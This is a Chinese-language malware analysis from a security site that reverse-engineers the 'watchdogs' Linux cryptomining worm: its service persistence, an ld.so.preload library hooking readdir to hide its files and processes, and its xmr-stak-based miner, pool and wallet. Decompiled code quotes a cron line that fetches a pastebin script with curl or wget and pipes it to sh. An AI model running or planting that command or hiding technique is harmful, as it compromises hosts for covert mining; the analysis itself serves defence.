**昨晚针对最近两天出现的挖矿病毒进行了分析，由于太困，没有完善好paper就睡了，没想到第二天有人就已经发了一篇比较完善的分析报告了，一口老血差点吐了。不过，看了下他的分析报告，和我找的点基本差不多，不过其中有一些他没有说到，比如如何找到钱包地址，以及针对挖矿程序ksoftirqds的分析，他也没有说明，所以我在这里给一下我的分析过程。**  

## 0x1 Watchdogs程序

首先分析下watchdog程序。

由于程序使用golang编写的ida无法识别其中的符号信息，需要手动修复一下，可使用以下idapython脚本进行修复，修复后可还原一部分方法名。便于之后的分析。

> 脚本地址：<https://rednaga.io/2016/09/21/reversing_go_binaries_like_a_pro>

通过脚本还原符号，重命名了 3946 个方法。

下面分析主函数 main.main()：

Main 函数中主要做的工作就是：

> 1\. 将watchdogs这个进程设置为系统服务
>
> 2\. 将libioset写入到/etc/ld.so.preload中
>
> 3\. 将写入定时任务，远程下载挖矿文件
>
> 4\. 启动ksoftirqds进程进行挖矿操作
>
> 5\. 更新程序
>
> 6\. 删除一些文件（watchdogs&ksoftirqds&config.json）

![](https://image.3001.net/images/20190223/1550910901_5c7105b5c6a87.png!small)

下面是详细分析。

主要操作预览：

![](https://image.3001.net/images/20190223/1550910919_5c7105c773172.png!small)

这里是将watchdogs添加为系统服务：

![](https://image.3001.net/images/20190223/1550910934_5c7105d61dfb3.png!small)

这里大概的意思是将libioset.so写入奥/etc/local/ld.so.preload：

![](https://image.3001.net/images/20190223/1550910944_5c7105e0679e9.png!small)

这里是写入配置信息到文件/tmp/config.json中：

![](https://image.3001.net/images/20190223/1550910950_5c7105e6ad0fe.png!small)

这里是写入定时任务：

![](https://image.3001.net/images/20190223/1550910963_5c7105f322e6c.png!small)

通过查看计划任务发现。

每15分钟执行一次下载操作：

![](https://image.3001.net/images/20190223/1550910974_5c7105feb798f.png!small)

通过网页访问这个url发现其是一段base64加密的数据。

Base64解密后如下。

这里是检查更新：

![](https://image.3001.net/images/20190223/1550910999_5c710617afce6.png!small)

通过tcpdump进行协议抓包分析，发现有挖矿行为：

![](https://image.3001.net/images/20190223/1550911005_5c71061d2a94d.png!small)

通过htop进行进程分析，发现会启动以下的进程，cpu占用率极高：

![](https://image.3001.net/images/20190223/1550911012_5c7106246abce.png!small)

通过使用inotify监视bin目录，发现其删除了一个netstat命令：

![](https://image.3001.net/images/20190223/1550911023_5c71062f789df.png!small)

通过分析可知watchdogs可知程序执行过程中会释放watchdogs，config.json及ksoftirqds到tmp目录下。

下面我们来细细的分析下释放出来的挖矿木马程序ksoftirqds。

在watchdogs的中，对watchdos，config.json，ksoftrqds进行了删除操作：

![](https://image.3001.net/images/20190223/1550911033_5c71063952af9.png!small)

另外为了隐藏进程信息及相关的文件信息，该病毒也对对一些libc.so中的函数进行了重写，如readdir函数。

主要工作：

1、加载动态链接库libc.so

2、old_readdir =(__int64 (__fastcall *)(_QWORD))dlsym(libc, "readdir");//
加载libc.so中的readdir函数，打开一个目录。

这里有一个do while statement：

    
    
    do
    
      {
    
       v4 = old_readdir(a1);                       // 使用readdir打开一个目录
    
       if ( v4 )
    
        {
    
         if ( (unsigned int)get_dir_name(a1, &s1, 0x100uLL)// 调用getdirname
    
           && !strcmp(&s1, "/proc")
    
           && (unsigned int)get_process_name(v4 + 19, &v3)
    
           && !strcmp(&v3, "ksoftirqds") )
    
         {
    
           return 0LL;
    
         }
    
         if ( !strcmp(&v3, "watchdogs") )
    
           return 0LL;
    
        }
    
       if ( v4 && !strcmp((const char *)(v4 + 19), ".") )
    
         strcmp((const char *)(v4 + 19), "/");
    
      }
    
     while ( v4
    
          && (strstr((const char *)(v4 + 19), "ksoftirqds")// 判断ksoftirqds是否是v4+19这个地址中的字符串的子集
    
            || strstr((const char *)(v4 + 19),"ld.so.preload")
    
           || strstr((const char *)(v4 + 19), "libioset.so")) );

大致的意思是：

如果存在v4+19 地址上存在ksoftirqds，ld.so.preload，libioset.so，则检查指定目录：

    
    
    是否存在ld.so.preload文件
    
    是否存在ksoftirqds的信息
    
    是否存在watchdog的信息

这里是重写了readir函数，作用是，如果程序使用了该函数执行后，结果中包含恶意应用名称及路径，则不返回相应结果，起到隐藏作用。

另外程序也对rmdir函数进行了重写，防止恶意程序的文件被删除。

这里是重写的函数列表：

![](https://image.3001.net/images/20190223/1550911085_5c71066d6ba85.png!small)

其中作者不仅在access中做了隐藏操作，进行了写入计划任务的操作：

这里是写入定时任务：

    
    
      s =fopen("/etc/cron.d/root", "w+");
    
      if( s )
    
      {
    
       fwrite(
    
         "*/10 * * * * root (curl -fsSL<https://pastebin.com/raw/sByq0rym>||wget -q -O-<https://pastebin.com/raw/sByq0rym>)|sh\n##",
    
         1uLL,
    
         0x75uLL,
    
         s);
    
       fclose(s);
    
      }

## 0x2 针对ksoftirqds的分析（挖矿）

如果我们想分析ksoftirqds的话，需要将tmp目录使用chattr +a /tmp命令锁住，这样可以防止这些文件被删除。

通过分析发现，这个木马文件也是用upx加壳的，我们使用upx工具执行：upx-d 即可脱壳。

下面使用ida进行源码分析。

首先使用ida的字符串检索功能，找到如下矿池地址：

![](https://image.3001.net/images/20190223/1550911070_5c71065e708e8.png!small)

搜索xmr.f2pool.com，跟入并寻找引用位置。

找到了钱包钱包地址：

![](https://image.3001.net/images/20190223/1550911096_5c710678d15b8.png!small)

它是在do_guided_pool_config这个函数中的，这里做矿池配置。

    
    
    Main()->do_guided_pool_config()

通过分析该木马使用的是一款名叫xmr-stak的挖矿程序：

![](https://image.3001.net/images/20190223/1550911113_5c7106890a919.png!small)

它的项目地址地址在 <https://github.com/fireice-uk/xmr-stak>。

![](https://image.3001.net/images/20190223/1550911148_5c7106ac76480.png!small)

对象的github项目的特征位置：

![](https://image.3001.net/images/20190223/1550911155_5c7106b3ec50f.png!small)

这款挖矿系统除了能够挖掘门罗币，还能够挖掘以下的虚拟货币：

![](https://image.3001.net/images/20190223/1550911166_5c7106be5d962.png!small)

watchdogs 中写入定时任务，释放ksoftirqds进行挖矿，并每个15分钟检查更新。

ksofttirqds 程序主要是使用xmr-stak挖矿程序挖掘门罗币。

其矿池为：tcp://xmr.f2pool.com:13531

钱包地址为：46FtfupUcayUCqG7Xs7YHREgp4GW3CGvLN4aHiggaYd75WvHM74Tpg1FVEM8fFHFYDSabM3rPpNApEBY4Q4wcEMd3BM4Ava.tenx

 ***本文作者：郑斯碟@默安科技，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

